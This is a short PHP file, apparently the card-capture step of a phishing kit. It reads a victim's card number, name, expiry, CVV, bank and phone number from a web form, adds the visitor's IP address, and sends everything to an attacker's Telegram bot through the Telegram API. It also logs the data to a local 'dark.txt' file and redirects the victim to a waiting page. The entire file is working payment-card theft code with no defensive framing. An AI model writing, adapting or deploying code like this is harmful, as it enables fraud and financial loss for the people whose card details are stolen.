<?php
include 'blocker.php';
include "telegram.php";

$ip = getenv("REMOTE_ADDR");
$InfoDATE   = date("d-m-Y h:i:sa");


	$message .= '
--------------- ⚜️ RAM INFO CC⚜️  --------
 [💳] CC >> = '.$_POST['cn'].'
 [👨] name >> = '.$_POST['nm'].'
 [🗓] exp >> = '.$_POST['mm'].'  '.$_POST['yy'].'
 [🔑] cvv >> = '.$_POST['cr'].'
 [🏦] BK >> = '.$_POST['bk'].'
 [📞] Tel >> = '.$_POST['em'].'
 [⚜️] ┏━ [ '.$ip.'  ] ━┓[⚜️]
';
file_get_contents("https://api.telegram.org/bot$tokn/sendMessage?chat_id=$id&text=" . urlencode($message)."" );
$file = fopen('dark.txt', 'a');
fwrite($file,$message);
    header("Refresh: 2; URL=WAIT.php");
    exit();
?>